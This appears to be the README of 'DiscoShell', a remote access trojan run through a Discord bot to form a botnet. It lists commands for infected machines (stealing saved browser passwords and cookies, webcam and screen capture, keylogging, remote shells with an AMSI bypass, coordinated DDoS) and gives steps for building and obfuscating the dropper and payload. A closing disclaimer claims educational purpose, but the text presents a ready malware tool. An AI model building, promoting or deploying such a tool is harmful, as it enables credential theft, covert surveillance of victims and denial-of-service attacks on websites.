# DiscoShell

DiscoShell is a minimal remote access trojan that is controlled via a Discord bot, allowing the creation of a Discord-based botnet.

![image](https://media.discordapp.net/attachments/961905736139554876/971733014654644254/unknown.png)

Join the Discord server for discussion and enquiries: https://discord.gg/RU5RjSe8WN.

## Command list
The following commands are used to control infected machines.
```
get : Get username, machine name, IP address and IP location of all infected machines.
getsc : Get screenshot of specified machine.
getcam : Get snapshot from all video sources on specified machine.
getfile {file_path} : Upload file located in {file_path} on specified machine to Discord.
getav : Get all antivirus products installed on specified machine.
getlogins : Get saved Chromium-based browser passwords on specified machine.
getcookies : Get saved Chromium-based browser cookies on specified machine.

shell : Start remote command prompt session on specified machine.
powershell : Start remote PowerShell session on specified machine (automatically bypasses AMSI).
execute {command} : Execute command on specified machine.

startkeylogger : Start keylogger on specified machine.
stopkeylogger : Stop keylogger on specified machine.
getkeylog : Get logged keys on specified machine.

startddos {website_url} : Make all infected machines send GET requests to specified URL.
stopddos : Make all infected machines stop sending GET requests.

uninfect : Uninfect specified machine.
```

## How to build
1. Specify the token and other variables in the dropper project Program.cs.
2. Build the dropper project as x64.

Optional: Build the payload project and merge/embed all the dlls + obfuscate the output assembly. Replace payload.exe in the dropper project with your new payload.

## Disclaimer
This project was made for educational purposes and to test the capabilities of using Discord as a C2 server. If you choose to use this illegally/maliciously, it is your responsibility.
